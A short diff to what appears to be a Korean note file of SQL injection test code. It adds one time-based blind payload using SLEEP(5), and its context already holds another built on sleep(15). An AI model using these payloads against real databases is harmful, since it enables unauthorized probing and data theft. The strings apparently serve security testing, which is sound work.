@@ -21,6 +21,11 @@ SqIinjection 테스트 코드
 'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z 
 ```
 
+테스트
+```
+'||(SELECT 0x615a636e FROM DUAL WHERE 7192=7192 AND (SELECT 4865 FROM (SELECT(SLEEP(5)))VDbe))||'
+```
+
 
 OR x=y     
 
